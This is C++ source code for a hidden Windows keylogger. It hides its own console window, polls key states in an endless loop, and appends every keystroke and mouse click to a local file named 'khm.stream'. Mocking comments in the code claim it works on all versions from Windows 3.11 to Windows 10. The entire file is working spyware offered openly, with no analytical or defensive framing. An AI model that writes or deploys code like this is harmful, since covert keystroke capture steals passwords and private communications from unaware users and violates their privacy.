#define _WIN32_WINNT 0x0500 // lulz on these
#include <windows.h> // also lulz
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

void LOG(string input) {
	fstream LogFile;
	LogFile.open("khm.stream", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		cout << " ";
		LOG(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		LOG("\n");
		return true;
/*	case '¾':
		cout << ".";
		LOG(".");
		return true;
*/
	case VK_SHIFT:
		cout << "#SHIFT#";
		LOG("#SHIFT#");
		return true;
	case VK_BACK:
		cout << "\b";
		LOG("\b");
		return true;
	case VK_RBUTTON:
		cout << "#Desni_Misonja#";
		LOG("#Desni_Misonja#");
		return true;
	case VK_LBUTTON:
		cout << "LijeviMic";
		LOG("#LijeviMic");
		return true;
	
	default: 
		return false;
	}
}

int main()

{
	ShowWindow(GetConsoleWindow(), SW_HIDE); // lol
	char KEY = 'x';
	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32555) {
				if (SpecialKeys(KEY) == false) {

					fstream LogFile;
					LogFile.open("khm.stream", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}
			}
		}
	}
	return 0;
}
// it works on win 3.11 up to win 10.
